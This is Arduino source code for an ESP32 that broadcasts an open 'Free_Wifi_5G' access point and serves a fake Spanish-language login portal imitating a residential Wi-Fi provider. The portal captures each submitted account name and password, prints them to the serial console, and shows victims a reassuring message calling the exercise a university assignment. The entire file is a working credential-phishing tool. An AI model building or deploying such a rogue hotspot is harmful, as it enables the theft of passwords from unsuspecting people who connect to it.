#include <WiFi.h>
#include <WebServer.h>

const char* ssid = "Free_Wifi_5G";
WebServer server(80);

void handleRoot() {
  String html = "<!DOCTYPE html><html><head><title>Wifi Residencial | Club Movil Wifi</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; background-color: #f4f4f8; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }";
  html += "form { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 300px; }";
  html += "input, button { margin: 10px; padding: 10px; width: 100%; box-sizing: border-box; }";
  html += "button { background-color: #4CAF50; color: white; border: none; border-radius: 5px; padding: 15px 20px; text-decoration: none; font-size: 16px; cursor: pointer; transition: background-color 0.3s ease; }";
  html += "button:hover { background-color: #45a049; }";  
  html += "button:active { background-color: #3e8e41; }";  
  html += "</style></head>";
  html += "<body>";
  html += "<h1>Inicia Sesi&oacute;n.&nbsp;&nbsp;&nbsp;</h1>";
  html += "<form action='/login' method='POST'>";
  html += "<input type='text' name='username' placeholder='No. de cuenta o correo' required>";
  html += "<input type='password' name='password' placeholder='Contrase&ntilde;a' required>";
  html += "<button type='submit'>Inicia Sesi&oacute;n</button>";
  html += "</form></body></html>";
  server.send(200, "text/html", html);
}

void handleLoginPost() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String username = server.arg("username");
    String password = server.arg("password");

    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);

    if (username == "admin" && password == "admin") {
      server.send(200, "text/html", "<h1>Welcome back, admin!</h1>");
    } else {
      server.send(401, "text/html", "<h1>Inicio de sesi&oacute;n exitoso.</h1><p>Sus datos no ser&aacute;n almacenados, s&oacute;lo es una tarea de Universidad :D</p>");
    }
  } else {
    server.send(400, "text/html", "<h1>Error</h1><p>Missing username or password.</p>");
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLoginPost);

  server.begin();
}

void loop() {
  server.handleClient();
}
